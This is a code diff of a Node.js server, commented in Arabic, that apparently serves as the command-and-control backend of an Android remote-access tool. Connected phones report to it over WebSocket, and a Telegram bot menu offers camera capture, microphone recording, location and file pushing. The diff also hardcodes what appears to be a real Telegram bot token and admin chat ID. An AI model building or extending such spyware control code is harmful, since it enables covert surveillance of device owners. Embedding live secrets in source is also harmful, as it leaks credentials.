@@ -9,9 +9,45 @@ const axios = require('axios');
 const moment = require('moment');
 const helmet = require('helmet');
 const cors = require('cors');
-const { RateLimiterMemory } = require('rate-limiter-flexible');
+const rateLimit = require('express-rate-limit');
 
-// تهيئة التطبيق
+// ==================== الإعدادات الرئيسية ====================
+const CONFIG = {
+  bot: {
+    // 🔴 🔴 🔴 ضع التوكن والآيدي هنا 🔴 🔴 🔴
+    token: process.env.BOT_TOKEN || '8275181418:AAHRGLNjc6JxI2wiboqDJFpw3HEvCugn4fA',
+    adminId: process.env.ADMIN_CHAT_ID || '7604667042',
+    pollInterval: 3000
+  },
+  server: {
+    port: process.env.PORT || 3000,
+    host: '0.0.0.0'
+  },
+  security: {
+    allowedFileTypes: ['image/', 'video/', 'audio/', 'text/', 'application/pdf'],
+    maxFileSize: 10 * 1024 * 1024,
+    sessionTimeout: 30 * 60 * 1000
+  }
+};
+
+// ==================== التحقق من الإعدادات ====================
+function validateConfig() {
+  if (CONFIG.bot.token.includes('ضع_التوكن')) {
+    console.error('❌ خطأ: لم تضف توكن البوت!');
+    console.log('📝 اذهب إلى @BotFather في تيليجرام واحصل على التوكن');
+    process.exit(1);
+  }
+  
+  if (CONFIG.bot.adminId.includes('ضع_الآيدي')) {
+    console.error('❌ خطأ: لم تضف آيدي الدردشة!');
+    console.log('📝 اذهب إلى @userinfobot في تيليجرام واحصل على الآيدي');
+    process.exit(1);
+  }
+  
+  console.log('✅ الإعدادات صحيحة - جاري تشغيل النظام...');
+}
+
+// ==================== تهيئة التطبيق ====================
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -22,28 +58,21 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// معدل الاستخدام للحماية من الهجمات
-const rateLimiter = new RateLimiterMemory({
-  keyGenerator: (req) => req.ip,
-  points: 10,
-  duration: 1
+// معدل الاستخدام للحماية
+const limiter = rateLimit({
+  windowMs: 1 * 60 * 1000,
+  max: 10,
+  message: '❌ عدد الطلبات كبير جداً، الرجاء المحاولة لاحقاً'
 });
+app.use(limiter);
 
-app.use((req, res, next) => {
-  rateLimiter.consume(req.ip)
-    .then(() => next())
-    .catch(() => res.status(429).send('Too Many Requests'));
-});
-
-// إعدادات التحميل
+// إعدادات رفع الملفات
 const upload = multer({
   limits: {
-    fileSize: 10 * 1024 * 1024 // 10MB حد أقصى
+    fileSize: CONFIG.security.maxFileSize
   },
   fileFilter: (req, file, cb) => {
-    // السماح بأنواع ملفات محددة فقط
-    const allowedTypes = ['image/', 'video/', 'audio/', 'text/', 'application/pdf'];
-    if (allowedTypes.some(type => file.mimetype.startsWith(type))) {
+    if (CONFIG.security.allowedFileTypes.some(type => file.mimetype.startsWith(type))) {
       cb(null, true);
     } else {
       cb(new Error('نوع الملف غير مسموح به'), false);
@@ -51,53 +80,27 @@ const upload = multer({
   }
 });
 
-// إعدادات البوت
-const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || 'YOUR_CHAT_ID_HERE';
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// ==================== إعداد البوت ====================
+console.log('🔧 جاري تهيئة بوت التليجرام...');
+const bot = new TelegramBot(CONFIG.bot.token, { 
+  polling: true,
+  request: {
+    timeout: 60000
+  }
+});
 
-// تخزين البيانات
+// التحقق من اتصال البوت
+bot.getMe().then(botInfo => {
+  console.log(`✅ البوت يعمل: @${botInfo.username}`);
+}).catch(error => {
+  console.error('❌ خطأ في البوت:', error.message);
+  process.exit(1);
+});
+
+// ==================== إدارة الأجهزة ====================
 const connectedDevices = new Map();
 const deviceSessions = new Map();
-const userPermissions = new Map();
 
-// فئات الأوامر
-const commandCategories = {
-  device: '📱 إدارة الأجهزة',
-  message: '📨 الرسائل',
-  media: '🎭 الوسائط',
-  system: '⚙️ النظام',
-  security: '🔒 الأمان'
-};
-
-// لوحة المفاتيح الرئيسية
-const mainKeyboard = {
-  reply_markup: {
-    keyboard: [
-      ['📱 قائمة الأجهزة', '🔍 معلومات الجهاز'],
-      ['📨 إرسال رسالة', '📍 إرسال موقع'],
-      ['📁 إرسال ملف', '🎤 تسجيل ميكروفون'],
-      ['📷 كاميرا أمامية', '📸 كاميرا خلفية'],
-      ['🔔 إشعار', '🔊 تشغيل صوت'],
-      ['⚙️ الإعدادات', '📊 الإحصائيات']
-    ],
-    resize_keyboard: true
-  }
-};
-
-// إعدادات لوحة المفاتيح
-const settingsKeyboard = {
-  reply_markup: {
-    keyboard: [
-      ['🔐 تغيير الصلاحيات', '⏱️ ضبط المهلة'],
-      ['📝 تغيير الرسالة الترحيبية', '🔄 إعادة تشغيل البوت'],
-      ['🏠 القائمة الرئيسية']
-    ],
-    resize_keyboard: true
-  }
-};
-
-// وظائف مساعدة
 class DeviceManager {
   static addDevice(ws, deviceInfo) {
     const deviceId = uuidv4();
@@ -168,7 +171,7 @@ class DeviceManager {
   }
 }
 
-// وظائف البوت المحسنة
+// ==================== إدارة البوت ====================
 class BotManager {
   static sendMainMenu(chatId) {
     const welcomeMessage = `
@@ -202,14 +205,13 @@ class BotManager {
       const lastSeen = moment(device.lastActivity).fromNow();
       
       message += `*${index + 1}. ${device.info.model}*\n`;
-      message += `   🆔: ${device.id}\n`;
+      message += `   🆔: \`${device.id}\`\n`;
       message += `   🔋 البطارية: ${device.info.battery || 'غير معروف'}%\n`;
       message += `   📶 الإصدار: ${device.info.version || 'غير معروف'}\n`;
       message += `   ⏰ متصل منذ: ${uptime}\n`;
       message += `   🔄 آخر نشاط: ${lastSeen}\n\n`;
     });
 
-    // إنشاء أزرار لكل جهاز
     const inlineKeyboard = devices.map(device => [
       {
         text: `⚙️ ${device.info.model}`,
@@ -236,7 +238,7 @@ class BotManager {
 🔍 *معلومات الجهاز التفصيلية*
 
 📱 *النموذج:* ${device.info.model}
-🆔 *المعرف:* ${device.id}
+🆔 *المعرف:* \`${device.id}\`
 🔋 *البطارية:* ${device.info.battery}%
 📶 *إصدار الأندرويد:* ${device.info.version}
 💡 *سطوع الشاشة:* ${device.info.brightness}%
@@ -281,7 +283,33 @@ class BotManager {
   }
 }
 
-// مسارات الويب
+// ==================== لوحات المفاتيح ====================
+const mainKeyboard = {
+  reply_markup: {
+    keyboard: [
+      ['📱 قائمة الأجهزة', '🔍 معلومات الجهاز'],
+      ['📨 إرسال رسالة', '📍 إرسال موقع'],
+      ['📁 إرسال ملف', '🎤 تسجيل ميكروفون'],
+      ['📷 كاميرا أمامية', '📸 كاميرا خلفية'],
+      ['🔔 إشعار', '🔊 تشغيل صوت'],
+      ['⚙️ الإعدادات', '📊 الإحصائيات']
+    ],
+    resize_keyboard: true
+  }
+};
+
+const settingsKeyboard = {
+  reply_markup: {
+    keyboard: [
+      ['🔐 تغيير الصلاحيات', '⏱️ ضبط المهلة'],
+      ['📝 تغيير الرسالة الترحيبية', '🔄 إعادة تشغيل البوت'],
+      ['🏠 القائمة الرئيسية']
+    ],
+    resize_keyboard: true
+  }
+};
+
+// ==================== مسارات الويب ====================
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -290,34 +318,63 @@ app.get('/', (req, res) => {
         <title>نظام التحكم في الأجهزة</title>
         <meta charset="utf-8">
         <style>
-            body { font-family: Arial, sans-serif; margin: 40px; direction: rtl; }
-            .stats { background: #f4f4f4; padding: 20px; border-radius: 10px; }
-            .device { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px; }
+            body { 
+                font-family: Arial, sans-serif; 
+                margin: 40px; 
+                direction: rtl; 
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+            }
+            .container {
+                max-width: 800px;
+                margin: 0 auto;
+                background: rgba(255,255,255,0.1);
+                padding: 30px;
+                border-radius: 15px;
+                backdrop-filter: blur(10px);
+            }
+            .stats { 
+                background: rgba(255,255,255,0.2); 
+                padding: 20px; 
+                border-radius: 10px; 
+                margin-bottom: 20px;
+            }
+            .device { 
+                border: 1px solid rgba(255,255,255,0.3); 
+                padding: 15px; 
+                margin: 10px 0; 
+                border-radius: 5px; 
+                background: rgba(255,255,255,0.1);
+            }
+            h1 { text-align: center; margin-bottom: 30px; }
         </style>
     </head>
     <body>
-        <h1>🎯 نظام التحكم في الأجهزة</h1>
-        <div class="stats">
-            <h3>📊 الإحصائيات:</h3>
-            <p>📱 الأجهزة المتصلة: <strong>${connectedDevices.size}</strong></p>
-            <p>⏰ وقت الخادم: <strong>${new Date().toLocaleString('ar-SA')}</strong></p>
-        </div>
-        <div class="devices">
-            <h3>📲 الأجهزة المتصلة:</h3>
-            ${DeviceManager.getAllDevices().map(device => `
-                <div class="device">
-                    <strong>${device.info.model}</strong><br>
-                    🔋 ${device.info.battery}% | 📶 ${device.info.version}<br>
-                    ⏰ ${moment(device.connectedAt).fromNow()}
-                </div>
-            `).join('') || '<p>لا توجد أجهزة متصلة</p>'}
+        <div class="container">
+            <h1>🎯 نظام التحكم في الأجهزة</h1>
+            <div class="stats">
+                <h3>📊 الإحصائيات:</h3>
+                <p>📱 الأجهزة المتصلة: <strong>${connectedDevices.size}</strong></p>
+                <p>⏰ وقت الخادم: <strong>${new Date().toLocaleString('ar-SA')}</strong></p>
+                <p>🚀 حالة النظام: <strong>🟢 يعمل</strong></p>
+            </div>
+            <div class="devices">
+                <h3>📲 الأجهزة المتصلة:</h3>
+                ${DeviceManager.getAllDevices().map(device => `
+                    <div class="device">
+                        <strong>${device.info.model}</strong><br>
+                        🔋 ${device.info.battery}% | 📶 ${device.info.version}<br>
+                        ⏰ ${moment(device.connectedAt).fromNow()}
+                    </div>
+                `).join('') || '<p>لا توجد أجهزة متصلة</p>'}
+            </div>
         </div>
     </body>
     </html>
   `);
 });
 
-// مسارات API
+// ==================== مسارات API ====================
 app.post('/api/send-message', upload.none(), (req, res) => {
   try {
     const { deviceId, message } = req.body;
@@ -353,10 +410,8 @@ app.post('/api/upload-file', upload.single('file'), (req, res) => {
     };
 
     if (deviceId) {
-      // إرسال لجهاز محدد
       DeviceManager.sendToDevice(deviceId, 'receive_file', fileInfo);
     } else {
-      // بث لجميع الأجهزة
       DeviceManager.broadcast('receive_file', fileInfo);
     }
 
@@ -366,45 +421,57 @@ app.post('/api/upload-file', upload.single('file'), (req, res) => {
   }
 });
 
-// WebSocket handling
+app.get('/api/devices', (req, res) => {
+  const devices = DeviceManager.getAllDevices().map(device => ({
+    id: device.id,
+    model: device.info.model,
+    battery: device.info.battery,
+    version: device.info.version,
+    connectedAt: device.connectedAt,
+    status: device.status
+  }));
+  
+  res.json({ success: true, devices: devices });
+});
+
+// ==================== WebSocket Handling ====================
 wss.on('connection', (ws, req) => {
-  console.log('🔌 محاولة اتصال جديدة...');
+  console.log('🔌 محاولة اتصال جديدة من جهاز...');
 
   ws.on('message', (data) => {
     try {
       const message = JSON.parse(data);
       
       if (message.type === 'device_info') {
-        // تسجيل الجهاز الجديد
         const deviceId = DeviceManager.addDevice(ws, message.data);
         
-        // إرسال تأكيد الاتصال
         ws.send(JSON.stringify({
           type: 'connection_established',
           deviceId: deviceId,
           timestamp: new Date().toISOString()
         }));
 
-        // إشعار المدير
-        bot.sendMessage(ADMIN_CHAT_ID, 
-          `🟢 *جهاز جديد متصل*\n\n` +
-          `📱 *النموذج:* ${message.data.model}\n` +
-          `🔋 *البطارية:* ${message.data.battery}%\n` +
-          `📶 *الإصدار:* ${message.data.version}\n` +
-          `🆔 *المعرف:* ${deviceId}`,
-          { parse_mode: 'Markdown' }
-        );
+        if (CONFIG.bot.adminId) {
+          bot.sendMessage(CONFIG.bot.adminId, 
+            `🟢 *جهاز جديد متصل*\n\n` +
+            `📱 *النموذج:* ${message.data.model}\n` +
+            `🔋 *البطارية:* ${message.data.battery}%\n` +
+            `📶 *الإصدار:* ${message.data.version}\n` +
+            `🆔 *المعرف:* \`${deviceId}\``,
+            { parse_mode: 'Markdown' }
+          );
+        }
       }
       else if (message.type === 'response') {
-        // معالجة ردود الأجهزة
         console.log('📨 رد من الجهاز:', message);
       }
       else if (message.type === 'error') {
-        // معالجة الأخطاء من الأجهزة
         console.error('❌ خطأ من الجهاز:', message.error);
       }
 
-      DeviceManager.updateActivity(ws.deviceId);
+      if (ws.deviceId) {
+        DeviceManager.updateActivity(ws.deviceId);
+      }
     } catch (error) {
       console.error('❌ خطأ في معالجة الرسالة:', error);
     }
@@ -424,13 +491,12 @@ wss.on('connection', (ws, req) => {
   });
 });
 
-// معالجة أوامر البوت
+// ==================== معالجة أوامر البوت ====================
 bot.on('message', (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
 
-  // التحقق من الصلاحيات
-  if (chatId != ADMIN_CHAT_ID) {
+  if (CONFIG.bot.adminId && chatId != CONFIG.bot.adminId) {
     bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
     return;
   }
@@ -484,6 +550,7 @@ bot.on('message', (msg) => {
 📱 الأجهزة المتصلة: *${connectedDevices.size}*
 🕒 وقت التشغيل: *${moment().format('YYYY-MM-DD HH:mm:ss')}*
 💾 استخدام الذاكرة: *${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB*
+🔧 إصدار Node.js: *${process.version}*
         `;
         bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
         break;
@@ -501,21 +568,23 @@ bot.on('message', (msg) => {
   }
 });
 
-// معالجة الردود
+// ==================== معالجة الردود ====================
 function handleReplies(chatId, msg) {
   const replyText = msg.reply_to_message.text;
   
   if (replyText.includes('الرسالة')) {
-    DeviceManager.broadcast('show_message', { message: msg.text });
-    bot.sendMessage(chatId, '✅ تم إرسال الرسالة لجميع الأجهزة', mainKeyboard);
+    const successCount = DeviceManager.broadcast('show_message', { message: msg.text });
+    bot.sendMessage(chatId, `✅ تم إرسال الرسالة إلى ${successCount} جهاز`, mainKeyboard);
   }
   else if (replyText.includes('الموقع')) {
-    // معالجة إرسال الموقع
     bot.sendMessage(chatId, '📍 سيتم إضافة دعم الموقع في التحديثات القادمة', mainKeyboard);
+  }
+  else if (replyText.includes('الملف')) {
+    bot.sendMessage(chatId, '📁 سيتم إضافة دعم الملفات في التحديثات القادمة', mainKeyboard);
   }
 }
 
-// معالجة الأزرار
+// ==================== معالجة الأزرار ====================
 bot.on('callback_query', (callbackQuery) => {
   const message = callbackQuery.message;
   const data = callbackQuery.data;
@@ -536,7 +605,13 @@ bot.on('callback_query', (callbackQuery) => {
     else if (data === 'main_menu') {
       BotManager.sendMainMenu(chatId);
     }
-    // يمكن إضافة المزيد من الأزرار هنا
+    else if (data.startsWith('notify_')) {
+      const deviceId = data.replace('notify_', '');
+      bot.sendMessage(chatId, '💬 اكتب نص الإشعار:', {
+        reply_markup: { force_reply: true }
+      });
+      deviceSessions.set(chatId, { action: 'send_notification', deviceId: deviceId });
+    }
 
     bot.answerCallbackQuery(callbackQuery.id);
   } catch (error) {
@@ -545,12 +620,12 @@ bot.on('callback_query', (callbackQuery) => {
   }
 });
 
-// تنظيف الاتصالات الميتة كل 5 دقائق
+// ==================== الصيانة التلقائية ====================
 setInterval(() => {
   const now = new Date();
   connectedDevices.forEach((device, deviceId) => {
     const inactiveTime = now - device.lastActivity;
-    if (inactiveTime > 5 * 60 * 1000) { // 5 دقائق
+    if (inactiveTime > 5 * 60 * 1000) {
       console.log(`🔴 فصل جهاز غير نشط: ${device.info.model}`);
       device.ws.close();
       DeviceManager.removeDevice(deviceId);
@@ -558,18 +633,33 @@ setInterval(() => {
   });
 }, 5 * 60 * 1000);
 
-// بدء الخادم
-const PORT = process.env.PORT || 3000;
+// إرسال نبضات حياة للخادم
+setInterval(() => {
+  try {
+    axios.get(`http://localhost:${CONFIG.server.port}`)
+      .then(() => console.log('💓 الخادم يعمل...'))
+      .catch(() => console.log('⚠️ تحقق من الخادم...'));
+  } catch (error) {
+    // تجاهل الأخطاء في النبضات
+  }
+}, 30000);
+
+// ==================== بدء التشغيل ====================
+validateConfig();
+
+const PORT = CONFIG.server.port;
 server.listen(PORT, () => {
   console.log(`
 🎯 نظام التحكم في الأجهزة يعمل بنجاح!
 📍 PORT: ${PORT}
+🤖 البوت: جاهز للإستقبال
 ⏰ الوقت: ${new Date().toLocaleString()}
 📱 انتظر اتصال الأجهزة...
+🔗 رابط الويب: http://localhost:${PORT}
   `);
 });
 
-// معالجة الأخطاء غير الملتقطة
+// ==================== معالجة الأخطاء ====================
 process.on('uncaughtException', (error) => {
   console.error('❌ خطأ غير متوقع:', error);
 });
